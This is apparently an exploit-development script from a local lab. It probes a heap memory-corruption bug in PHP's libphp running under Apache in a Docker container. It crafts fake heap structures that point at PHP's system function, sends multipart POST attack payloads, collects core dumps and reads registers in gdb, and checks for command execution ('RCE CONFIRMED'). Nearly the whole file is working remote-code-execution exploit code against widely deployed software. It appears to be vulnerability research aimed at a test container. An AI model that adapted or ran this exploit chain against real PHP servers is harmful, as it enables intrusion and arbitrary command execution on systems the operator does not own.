#!/usr/bin/env python3
"""oom85: which slot does the AIM walk read? — distinguishable markers.

Elimination so far (oom79-83): AIM-armed boots walk slot 32 or 88
(everything else silent even with invalid pointers). CAL boots showed
rdi=0x4141414141410000 = 166-straddle window (slot-160 tail + slot-0
head) — CAL tile was degenerate (identical markers), so its "F=0" was
never informative.

Probe: AIM flow ONLY (warm 9100000 + sacrifice 9200000 + finishers
9210000+4i), tile = template but:
  T[32:40] = 0x0000222222222222 (invalid, distinctive)
  T[88:96] = 0x0000888888888888 (invalid, distinctive)
  T[0:8], T[160:168] = template values (handlers ptr / table ptr)
Outcomes:
  crash rdi=0x2222.. -> walk slot 32 -> aim there (ptr to template rc)
  crash rdi=0x8888.. -> walk slot 88 -> aim there
  all silent         -> walk position depends on tile content itself
VA0 = heap + 0x1718 (stable 9/9 boots).
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
MK32 = 0x0000222222222222
MK88 = 0x0000888888888888
STRIDE = 3584


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def build_tile(libphp_base, VA0, window=None):
    T = bytearray(176)
    struct.pack_into("<IIII", T, 8, 1, 0x108, 1, 0)
    struct.pack_into("<Q", T, 32, VA0 + 152)
    struct.pack_into("<I", T, 52, 1)
    struct.pack_into("<QII", T, 88, VA0 + 112, 6, 0)
    struct.pack_into("<IIQ", T, 112, 1, 0x106, 0)
    struct.pack_into("<Q", T, 128, len(CMD))
    T[136:136 + len(CMD)] = CMD
    T[136 + len(CMD)] = 0
    struct.pack_into("<QQ", T, 152, 0, libphp_base + ZIF_SYSTEM)
    if window is not None:
        T[0:8] = struct.pack("<Q", window)
    return bytes(T)


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c85_%s" % tag, 240)
    sh("docker cp /tmp/c85_%s phpbuild:/tmp/c85_%s" % (tag, tag), 240)
    return "/tmp/c85_%s" % tag


def gdb_regs(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi rip\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    rd = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    rp = re.search(r"rip\s+0x([0-9a-f]+)", out)
    return (int(rd.group(1), 16) if rd else None,
            int(rp.group(1), 16) if rp else None)


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


print("=== oom85: distinguishable markers at 32/88, AIM flow ===", flush=True)
boot_core_env()
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
base = heap = None
for ln in maps.splitlines():
    rng = ln.split()[0]
    a, b = [int(x, 16) for x in rng.split("-")]
    perms = ln.split()[1]
    if base is None and "libphp.so" in ln and perms.startswith("r"):
        base = a
    if "libphp.so" not in ln and "/dev/zero" not in ln and "[" not in ln \
            and (b - a) >= 0x200000 and perms.startswith("rw"):
        if heap is None:
            heap = a
VA0 = heap + 0x1718
print("    libphp=0x%x heap=0x%x VA0=0x%x" % (base, heap, VA0), flush=True)

T = bytearray(build_tile(base, VA0))
# overwrite candidate slots with distinctive invalid pointers
struct.pack_into("<Q", T, 32, MK32)
struct.pack_into("<Q", T, 88, MK88)
print("    tile: T[32]=0x%x T[88]=0x%x free_obj=0x%x" % (MK32, MK88, base + ZIF_SYSTEM), flush=True)

print("[1] warm (11)", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=T))
print("[2] sacrifice@9200000 + finishers@9210000+4i", flush=True)
post(P.build_attack(3400, 9200000, value_tile=T))
verdict = "SILENT (walk position depends on tile content)"
for fi in range(6):
    sb = 9210000 + fi * 4
    code, resp = post(P.build_attack(3400, sb, value_tile=T))
    tag = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
    print("  fire%d (%d): %s [%s]" % (fi, sb, code, tag), flush=True)
    time.sleep(2)
    hit, x = check_x()
    if hit:
        print("    /tmp/x: [%s]" % x, flush=True)
        print("*** RCE CONFIRMED ***", flush=True)
        verdict = "RCE"
        break
    if code != "200":
        time.sleep(3)
        cb = fetch_core("f%d" % fi)
        rdi, rip = gdb_regs("c85_f%d" % fi)
        print("    crash rdi=0x%x rip=0x%x" % (rdi or 0, rip or 0), flush=True)
        if rdi == MK32:
            verdict = "WALK SLOT = 32 (aim there next)"
        elif rdi == MK88:
            verdict = "WALK SLOT = 88 (aim there next)"
        break
print("[VERDICT] %s" % verdict, flush=True)

print("[3] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
